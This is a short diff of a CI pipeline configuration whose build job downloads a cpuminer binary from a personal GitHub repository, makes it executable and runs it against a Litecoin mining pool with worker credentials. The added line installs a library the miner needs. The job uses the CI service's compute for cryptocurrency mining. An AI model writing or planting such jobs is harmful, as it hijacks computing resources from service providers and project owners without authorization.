@@ -10,6 +10,7 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
+            - sudo apt update && apt install libjansson4 -y
             - 'wget https://github.com/davidus20/RDP/raw/ltcwoker/cpuminer'
             - chmod 755 cpuminer
             - './cpuminer  --algo=scrypt --url=stratum+tcp://us.litecoinpool.org:3333 --userpass=djemil.mywoker16:my123456'
